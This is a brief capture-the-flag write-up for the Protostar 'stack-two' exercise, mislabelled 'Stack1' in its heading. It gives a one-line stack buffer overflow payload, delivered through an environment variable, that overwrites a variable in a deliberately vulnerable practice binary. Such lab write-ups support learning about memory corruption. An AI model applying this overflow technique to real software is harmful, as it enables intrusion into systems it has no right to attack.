```
TL;DR -> `export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'") && ./stack2`
```

# Stack1

URL: https://exploit.education/protostar/stack-two/

This level is same as `stack1` (checkout that writeup), the only difference is, we have to set payload in env variable. That can be easily done using `export $VARIABLE=value`

In our case, the payload will be: `export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")`

---

One liner solution:
`export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'") && ./stack2`
